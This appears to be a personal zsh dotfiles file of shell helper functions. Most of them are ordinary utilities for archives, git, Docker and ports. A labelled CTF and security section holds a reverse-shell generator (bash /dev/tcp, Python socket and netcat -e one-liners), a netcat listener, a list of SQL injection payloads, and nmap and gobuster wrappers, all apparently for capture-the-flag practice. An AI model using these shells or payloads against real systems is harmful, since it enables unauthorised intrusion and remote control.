# Useful Zsh Functions
# ====================

# Extract various archive formats
extract() {
    if [ -f $1 ]; then
        case $1 in
            *.tar.bz2)   tar xjf $1     ;;
            *.tar.gz)    tar xzf $1     ;;
            *.bz2)       bunzip2 $1     ;;
            *.rar)       unrar e $1     ;;
            *.gz)        gunzip $1      ;;
            *.tar)       tar xf $1      ;;
            *.tbz2)      tar xjf $1     ;;
            *.tgz)       tar xzf $1     ;;
            *.zip)       unzip $1       ;;
            *.Z)         uncompress $1  ;;
            *.7z)        7z x $1        ;;
            *)           echo "'$1' cannot be extracted via extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# Create directory and cd into it
mkcd() {
    mkdir -p "$1" && cd "$1"
}

# Find process by name
psgrep() {
    ps aux | grep -v grep | grep "$@" -i --color=auto;
}

# Kill process by name
killnamed() {
    ps aux | grep -v grep | grep "$@" -i --color=auto;
    echo ""
    echo "Type PID to kill:"
    read -r pid
    kill ${pid}
}

# Git clone and cd into directory
gclone() {
    git clone "$1" && cd "$(basename "$1" .git)"
}

# Quick backup of a file
backup() {
    cp "$1"{,.bak-$(date +%Y%m%d-%H%M%S)}
}

# Weather function with location
weather() {
    if [ $# -eq 0 ]; then
        curl -s "wttr.in?format=3"
    else
        curl -s "wttr.in/$1?format=3"
    fi
}

# Docker cleanup
docker-cleanup() {
    echo "Cleaning up Docker..."
    docker system prune -f
    docker volume prune -f
    docker image prune -a -f
    echo "Docker cleanup complete!"
}

# Create a new development project
newproject() {
    if [ $# -eq 0 ]; then
        echo "Usage: newproject <project-name>"
        return 1
    fi

    local project_name="$1"
    local project_dir="$HOME/dev/$project_name"

    mkdir -p "$project_dir"
    cd "$project_dir"

    # Initialize git repo
    git init

    # Create basic files
    touch README.md
    echo "# $project_name" > README.md
    echo "node_modules/\n.env\n*.log" > .gitignore

    echo "Project '$project_name' created at $project_dir"
}

# Search and replace in files
replace-in-files() {
    if [ $# -ne 3 ]; then
        echo "Usage: replace-in-files <search> <replace> <file-pattern>"
        return 1
    fi

    grep -rl "$1" $3 | xargs sed -i "s/$1/$2/g"
}

# Port management
port() {
    if [ $# -eq 0 ]; then
        echo "Usage: port <port-number>"
        return 1
    fi

    lsof -i :$1
}

killport() {
    if [ $# -eq 0 ]; then
        echo "Usage: killport <port-number>"
        return 1
    fi

    lsof -ti:$1 | xargs kill -9
}

# Update all the things
update-all() {
    echo "üîÑ Updating system packages..."
    sudo apt update && sudo apt upgrade -y

    echo "üîÑ Updating Oh My Zsh..."
    omz update

    echo "üîÑ Updating Rust..."
    rustup update

    echo "üîÑ Updating Node.js packages..."
    if command -v npm &> /dev/null; then
        npm update -g
    fi

    echo "‚úÖ All updates complete!"
}

# === CTF & SECURITY FUNCTIONS ===

# Quick port scan
portscan() {
    if [ $# -eq 0 ]; then
        echo "Usage: portscan <target>"
        return 1
    fi
    nmap -sS -O "$1"
}

# Extract and analyze files
ctf-extract() {
    if [ $# -eq 0 ]; then
        echo "Usage: ctf-extract <file>"
        return 1
    fi

    echo "üîç Analyzing file: $1"
    file "$1"
    echo ""

    echo "üìä File entropy:"
    binwalk -E "$1"
    echo ""

    echo "üîç Strings analysis:"
    strings "$1" | head -20
    echo ""

    echo "üìÅ Binwalk extraction attempt:"
    binwalk -e "$1"
}

# Quick web directory enumeration
webenum() {
    if [ $# -eq 0 ]; then
        echo "Usage: webenum <url>"
        return 1
    fi

    echo "üîç Enumerating directories on $1"
    gobuster dir -u "$1" -w /usr/share/wordlists/dirb/common.txt -t 50
}

# Base64 encode/decode with automatic detection
b64() {
    if [ $# -eq 0 ]; then
        echo "Usage: b64 <string>"
        echo "Automatically detects if input is base64 encoded"
        return 1
    fi

    # Try to decode first (if it's valid base64)
    if echo "$1" | base64 -d >/dev/null 2>&1; then
        echo "üîì Decoded:"
        echo "$1" | base64 -d
        echo ""
    fi

    echo "üîí Encoded:"
    echo "$1" | base64
}

# Hash analysis
hashid() {
    if [ $# -eq 0 ]; then
        echo "Usage: hashid <hash>"
        return 1
    fi

    echo "üîç Hash analysis for: $1"
    echo "Length: ${#1}"

    case ${#1} in
        32) echo "Possible: MD5" ;;
        40) echo "Possible: SHA1" ;;
        64) echo "Possible: SHA256" ;;
        96) echo "Possible: SHA384" ;;
        128) echo "Possible: SHA512" ;;
        *) echo "Unknown hash length" ;;
    esac
}

# Quick reverse shell generator
revshell() {
    if [ $# -ne 2 ]; then
        echo "Usage: revshell <ip> <port>"
        return 1
    fi

    local ip="$1"
    local port="$2"

    echo "üêö Reverse shell payloads for $ip:$port"
    echo ""
    echo "Bash:"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo ""
    echo "Python:"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "Netcat:"
    echo "nc -e /bin/sh $ip $port"
}

# Quick listener
listen() {
    if [ $# -eq 0 ]; then
        echo "Usage: listen <port>"
        return 1
    fi

    echo "üëÇ Listening on port $1"
    nc -nlvp "$1"
}

# SQLi payload generator
sqli() {
    echo "üíâ Common SQL injection payloads:"
    echo ""
    echo "Basic:"
    echo "' OR '1'='1"
    echo "' OR 1=1--"
    echo "admin'--"
    echo ""
    echo "Union based:"
    echo "' UNION SELECT null,null,null--"
    echo "' UNION SELECT 1,user(),database()--"
    echo ""
    echo "Time based:"
    echo "'; WAITFOR DELAY '00:00:05'--"
    echo "' OR SLEEP(5)--"
}

# CTF challenge workspace setup
ctf-workspace() {
    if [ $# -eq 0 ]; then
        echo "Usage: ctf-workspace <challenge-name>"
        return 1
    fi

    local challenge_name="$1"
    local workspace_dir="$HOME/ctf/$challenge_name"

    mkdir -p "$workspace_dir"
    cd "$workspace_dir"

    # Create common CTF directories
    mkdir -p {scripts,files,notes,exploits,wordlists}

    # Create a notes file
    echo "# CTF Challenge: $challenge_name" > notes/README.md
    echo "Date: $(date)" >> notes/README.md
    echo "" >> notes/README.md
    echo "## Challenge Description" >> notes/README.md
    echo "" >> notes/README.md
    echo "## Notes" >> notes/README.md
    echo "" >> notes/README.md
    echo "## Solution" >> notes/README.md

    echo "üèÅ CTF workspace created at $workspace_dir"
    echo "üìÅ Created directories: scripts, files, notes, exploits, wordlists"
}

# Show installed tools summary
show-tools() {
    if [[ -f "$HOME/.dotfiles/scripts/show-tools.sh" ]]; then
        bash "$HOME/.dotfiles/scripts/show-tools.sh"
    else
        echo "Tools summary script not found"
    fi
}
